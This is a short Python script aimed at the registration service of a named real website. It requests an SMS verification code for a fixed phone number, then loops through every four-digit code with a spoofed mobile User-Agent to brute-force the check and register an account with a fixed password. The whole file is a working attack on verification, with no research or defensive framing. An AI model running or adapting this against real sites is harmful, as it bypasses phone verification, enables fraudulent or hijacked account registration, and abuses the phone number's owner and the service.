# coding:utf-8

from mtools.pathtools import *
os.chdir(cur_file_dir(sys.path[0]))

import http.cookiejar
import urllib.request
import json
cookie = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookie))
opener.open('http://xinghuo.yixin.com/marketing/shsz') # get cookies
print(cookie)
def sendcode(mobile):
    data = "mobile=" + mobile + "&type=register"
    req = urllib.request.Request('http://xinghuo.yixin.com/sendregistercheckcode.shtml',data.encode('utf-8'))
    req.add_header('User-Agent', 'Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X; en-us) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53')
    res = urllib.request.urlopen(req).read().decode('utf-8')
    #print(res)
    #res = opener.open('http://xinghuo.yixin.com/sendregistercheckcode.shtml',data.encode('utf-8'))
    print(data)
    print(res)
    return res
    
def register():
    mobile = "13900000000"
    sendcode(mobile)
    for i in range(9999):
        code = "0" * (4 - len(str(i))) + str(i)
        data = "mobile=" + mobile + "&password=zxc123&checkcode=" + code
        req = urllib.request.Request('http://xinghuo.yixin.com/register.shtml',data.encode('utf-8'))
        req.add_header('User-Agent', 'Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X; en-us) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53')
        res = urllib.request.urlopen(req).read().decode('utf-8')
        res = json.loads(res)
        print(data)
        print(res)
        if res["resCode"] != "0":
            break
        
register()